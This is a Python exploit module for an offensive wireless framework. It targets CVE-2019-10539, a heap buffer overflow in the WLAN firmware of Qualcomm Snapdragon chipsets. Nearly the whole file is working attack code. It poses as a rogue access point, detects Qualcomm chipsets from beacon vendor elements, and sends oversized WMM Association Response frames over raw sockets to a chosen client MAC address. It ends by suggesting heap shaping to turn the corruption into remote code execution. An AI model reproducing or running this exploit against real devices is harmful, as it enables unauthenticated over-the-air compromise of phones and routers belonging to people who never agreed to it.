# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Qualcomm Snapdragon WLAN WMM IE Heap Buffer Overflow (CVE-2019-10539).

    The Qualcomm WLAN firmware in Snapdragon chipsets contains a heap buffer
    overflow triggered when processing an Association Response frame with an
    oversized WMM (Wi-Fi Multimedia / QoS) Information Element.  The firmware
    copies the IE payload into a fixed-size heap buffer without validating
    the length field, causing heap metadata corruption and enabling code
    execution at the firmware level.

    The attack is unauthenticated, over the air: an attacker operating a
    rogue AP can send a crafted Association Response to any client that
    initiates association.

    CVSS v3.1: 9.8 (Critical), AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Qualcomm WLAN WMM IE Heap Overflow RCE (CVE-2019-10539)",
        "description": (
            "Exploits CVE-2019-10539 via a heap overflow in the WMM "
            "Information Element parser of Qualcomm Snapdragon WLAN firmware. "
            "A crafted Association Response with an oversized WMM IE causes "
            "a heap buffer overflow in the WLAN firmware, corrupting adjacent "
            "heap chunks. Unauthenticated, over the air."
        ),
        "authors": (
            "Qualcomm Security Advisory (disclosure)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2019-10539",
            "https://www.qualcomm.com/company/product-security/bulletins/august-2019-bulletin",
            "https://source.android.com/security/bulletin/2019-08-01",
        ),
        "devices": (
            "Qualcomm Snapdragon 835 (MSM8998)",
            "Qualcomm Snapdragon 845 (SDM845)",
            "Qualcomm Snapdragon 855 (SM8150)",
            "Qualcomm IPQ8074",
            "Qualcomm QCA6174A",
            "Qualcomm QCA9377",
            "Qualcomm QCA9379",
        ),
    }

    interface = OptString("wlan0", "Wireless interface in monitor mode")
    target_mac = OptString("", "Target client MAC address (XX:XX:XX:XX:XX:XX)")
    bssid = OptString("", "Rogue AP BSSID to spoof (XX:XX:XX:XX:XX:XX)")
    channel = OptInteger(6, "Wi-Fi channel to operate on")
    timeout = OptFloat(3.0, "Socket timeout in seconds")
    overflow_size = OptInteger(256, "Size of overflow payload in the WMM IE")

    # 802.11 frame type/subtype for Association Response
    _FC_ASSOC_RESP = 0x0010
    # WMM IE: Vendor Specific (221), OUI 00:50:F2, type 2
    _WMM_OUI = b"\x00\x50\xf2"
    _WMM_TYPE = 0x02
    # Qualcomm vendor OUI
    _QCA_OUI = b"\x00\x03\x7f"

    def _mac_to_bytes(self, mac: str) -> bytes:
        return bytes(int(b, 16) for b in mac.split(":"))

    def _build_assoc_response(self, oversized: bool = False) -> bytes:
        """Build an 802.11 Association Response frame.

        When oversized is True, the WMM Information Element is padded far
        beyond the firmware's expected 24-byte WMM parameter set, triggering
        the heap overflow during IE parsing.
        """
        target = self._mac_to_bytes(self.target_mac)
        ap_mac = self._mac_to_bytes(self.bssid) if self.bssid else b"\x02\x00\x00\x00\x00\x02"

        # Frame Control: Association Response
        fc = struct.pack("<H", self._FC_ASSOC_RESP)
        duration = struct.pack("<H", 0)
        seq_ctrl = struct.pack("<H", 0)

        # Addr1=client, Addr2=AP, Addr3=BSSID
        header = fc + duration + target + ap_mac + ap_mac + seq_ctrl

        # Fixed fields: Capability (ESS, short preamble), Status=0 (success), AID=1
        body = struct.pack("<HHH", 0x0421, 0x0000, 0x0001)

        # Supported Rates IE (ID=1)
        rates = bytes([0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24])
        body += struct.pack("BB", 1, len(rates)) + rates

        # WMM IE (Vendor Specific, ID=221)
        if oversized:
            # Trigger: WMM IE with payload far exceeding the expected 24 bytes
            wmm_data = self._WMM_OUI + struct.pack("B", self._WMM_TYPE)
            wmm_data += b"\x01\x01"  # WMM version 1, QoS info
            wmm_data += b"\xcc" * self.overflow_size
            body += struct.pack("BB", 221, len(wmm_data)) + wmm_data
        else:
            # Standard WMM Parameter Set (24 bytes after OUI+type)
            wmm_data = self._WMM_OUI + struct.pack("B", self._WMM_TYPE)
            wmm_data += b"\x01\x00"  # WMM version 1, QoS info=0
            wmm_data += b"\x00" * 16  # AC parameter records (placeholder)
            body += struct.pack("BB", 221, len(wmm_data)) + wmm_data

        return header + body

    def _send_raw(self, frame: bytes) -> bool:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((self.interface, 0))
            sock.send(frame)
            sock.close()
            return True
        except OSError as e:
            print_error(f"Raw socket send failed: {e}")
            return False

    def _detect_qualcomm(self) -> bool:
        """Listen for probe responses / beacons and look for Qualcomm OUI."""
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout * 2)
            sock.bind((self.interface, 0))

            deadline = time.time() + self.timeout * 2
            while time.time() < deadline:
                try:
                    data = sock.recv(4096)
                except TimeoutError:
                    break

                if len(data) < 36:
                    continue

                # Look for Vendor Specific IE with Qualcomm OUI
                pos = 36
                while pos + 2 < len(data):
                    ie_id = data[pos]
                    ie_len = data[pos + 1]
                    if pos + 2 + ie_len > len(data):
                        break
                    if ie_id == 221 and ie_len >= 3:
                        oui = data[pos + 2: pos + 5]
                        if oui == self._QCA_OUI:
                            sock.close()
                            return True
                    pos += 2 + ie_len

            sock.close()
        except OSError:
            pass
        return False

    def run(self) -> None:
        if not self.target_mac:
            print_error("target_mac is required (target client MAC address)")
            return

        if not self.check():
            print_error("Could not confirm Qualcomm WLAN chipset on the target")
            return

        print_success("Qualcomm WLAN chipset detected; sending WMM IE heap overflow")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Detect Qualcomm WLAN chipset via vendor IEs in beacons."""
        if not self.target_mac:
            return False
        return self._detect_qualcomm()

    def _exploit(self) -> None:
        print_status(
            f"Crafting Association Response with oversized WMM IE "
            f"({self.overflow_size} bytes overflow) for {self.target_mac}"
        )

        frame = self._build_assoc_response(oversized=True)

        # Send multiple copies to increase reliability
        send_count = 4
        for i in range(send_count):
            if not self._send_raw(frame):
                print_error(f"Failed to send frame {i + 1}/{send_count}")
                return
            print_info(
                f"  Assoc Response {i + 1}/{send_count} sent ({len(frame)} bytes)"
            )
            time.sleep(0.02)

        print_success(
            "WMM IE overflow sequence delivered. If the target uses a vulnerable "
            "Qualcomm WLAN firmware, the heap has been corrupted during IE parsing. "
            "Combine with heap shaping to convert the corruption into controlled RCE."
        )
